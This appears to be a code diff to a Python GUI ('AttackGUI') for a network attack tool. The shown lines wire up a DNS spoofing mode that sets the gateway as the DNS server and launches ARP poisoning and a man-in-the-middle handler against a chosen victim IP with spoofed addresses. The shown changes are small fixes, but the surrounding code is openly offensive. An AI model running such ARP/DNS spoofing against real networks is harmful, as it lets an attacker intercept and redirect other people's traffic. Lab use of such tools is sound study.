@@ -151,6 +151,8 @@ class AttackGUI:
         self.attacker_ipv4 = ipv4
         self.attacker_ipv6 = ipv6
 
+        self.dns_server_entry = gateway_ip
+
     def get_gateway_ipv4(self):
         try:
             output = subprocess.check_output(
@@ -258,6 +260,7 @@ class AttackGUI:
             # DNS SPOOFING
             elif attack == "DNS Spoofing":
                 victim_ip = self.dns_victim_entry.get().strip()
+                server_ip = self.dns_server_entry
                 domain = self.dns_domain_entry.get().strip().lower()
                 spoof_ip = self.dns_spoof_ip_entry.get().strip()
                 spoof_ipv6 = self.dns_spoof_ipv6_entry.get().strip() or None
@@ -267,6 +270,7 @@ class AttackGUI:
                     return
 
                 self.log("Starting DNS spoofing:")
+                self.log(f"  Victim:    {victim_ip}")
                 self.log(f"  Domain:    {domain}")
                 self.log(f"  IPv4:      {spoof_ip}")
                 self.log(f"  IPv6:      {spoof_ipv6 or 'disabled'}")
@@ -278,7 +282,7 @@ class AttackGUI:
                     spoof_ipv6=spoof_ipv6,
                     logger=self.log
                 )
-                
+
                 arp_poisoner = ARPPoisoner(sc.conf.iface, victim_ip, server_ip, spoof_mac, self.log)
 
                 mitm_handler = MitmHandler(sc.conf.iface, server_ip, victim_ip, spoof_mac, spoof_ip, spoof_ipv6, self.log)
